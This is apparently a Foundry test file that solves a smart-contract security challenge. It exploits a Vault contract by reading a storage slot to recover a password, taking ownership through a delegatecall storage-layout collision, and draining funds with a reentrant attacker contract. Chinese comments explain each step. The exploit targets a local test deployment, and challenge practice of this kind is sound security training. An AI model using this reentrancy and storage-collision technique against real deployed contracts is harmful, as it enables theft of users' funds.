// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";


contract TestAttacker {
    Vault public vault;
    
    constructor(Vault _vault) {
        vault = _vault;
    }
    
    function attack() external payable {
        vault.deposite{value: msg.value}();
        vault.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        // 1.slot 布局：vault 合约 delegatecall 调用 vaultLogic 的 changeOwner 时，
        // 检查的 slot 1, slot 1 对应的是 vaultLogic 合约地址
        // 2.密码获取：读取 vault 合约的 slot 1, 得到 vaultLogic 合约地址, 也就是密码
        // 3.修改 owner
        // 4.提款 + 重入
        bytes32 logicSlot = vm.load(address(vault), bytes32(uint256(1)));
        address logicAddr = address(uint160(uint256(logicSlot)));
        bytes32 password = bytes32(uint256(uint160(logicAddr)));
        
        (bool success,) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", password, palyer)
        );
        require(success, "changeOwner failed");
        
        // 2. 开启提款（此时 owner 已经是 player)
        vault.openWithdraw();
        
        // 3. 部署攻击合约并提款（在提款时重入)
        // 重入原因：vault 合约先发送 eth, 再更新值
        TestAttacker attacker = new TestAttacker(vault);
        attacker.attack{value: 0.01 ether}();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}




